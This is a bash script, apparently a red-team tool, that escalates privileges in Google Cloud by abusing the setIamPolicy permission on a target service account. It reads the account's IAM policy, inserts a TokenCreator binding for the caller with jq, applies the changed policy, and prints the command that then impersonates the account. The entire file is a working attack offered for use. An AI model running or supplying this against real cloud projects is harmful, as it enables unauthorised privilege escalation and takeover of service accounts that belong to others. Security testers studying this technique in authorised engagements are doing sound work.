#!/bin/bash

# Simple GCP SA Impersonation Abuse Script
# Abuses iam.serviceAccounts.setIamPolicy to grant your current auth gcloud user TokenCreator on target SA.
# Usage: ./SetIamPermission-Abuse.sh <target_serviceaccount_email> [optional_project_id]

set -euo pipefail

# Step 0: Inputs
TARGET_SA="${1:-}"
if [ -z "$TARGET_SA" ]; then
  read -p "Enter target SA email: " TARGET_SA
fi

# Project ID (auto or arg)
PROJECT_ID="${2:-$(gcloud config get-value project 2>/dev/null)}"
if [ -z "$PROJECT_ID" ]; then
  PROJECT_ID=$(gcloud projects list --format="value(projectId)" | head -n 1)
  if [ -z "$PROJECT_ID" ]; then
    echo "Error: No project found. Set via gcloud config or arg."
    exit 1
  fi
fi

# Current principal (your active auth)
CURRENT_PRINCIPAL=$(gcloud auth list --filter=status:ACTIVE --format="value(account)")

# Add correct prefix if it's a service account (most common in red team chains)
MEMBER_TO_ADD="$CURRENT_PRINCIPAL"
if [[ "$CURRENT_PRINCIPAL" == *@*.iam.gserviceaccount.com ]]; then
  MEMBER_TO_ADD="serviceAccount:$CURRENT_PRINCIPAL"
fi

echo "Abusing setIamPolicy on $TARGET_SA in $PROJECT_ID"
echo "Granting TokenCreator to: $MEMBER_TO_ADD"

# Step 1: Dump current policy to JSON
gcloud iam service-accounts get-iam-policy "$TARGET_SA" \
  --project="$PROJECT_ID" \
  --format=json > policy.json 2>/dev/null || {
    echo "Failed to get current policy (missing iam.serviceAccounts.getIamPolicy?)"
    exit 1
  }

# Step 2: Add TokenCreator binding with correct prefixed member (dedupe via jq)
jq --arg member "$MEMBER_TO_ADD" --arg role "roles/iam.serviceAccountTokenCreator" '
  .bindings |= ( . // [] |
    . + (if any(.[]; .role == $role) then [] else [{"role": $role, "members": []}] end) |
    map( if .role == $role then (.members |= ( . // [] | . + [$member] | unique )) else . end )
  )
' policy.json > updated_policy.json

# Step 3: Apply the updated policy (abuse happens here)
gcloud iam service-accounts set-iam-policy "$TARGET_SA" \
  --project="$PROJECT_ID" \
  updated_policy.json

echo "Success! Now you can impersonate:"
echo "gcloud config set auth/impersonate_service_account $TARGET_SA"

# Cleanup
rm -f policy.json updated_policy.json
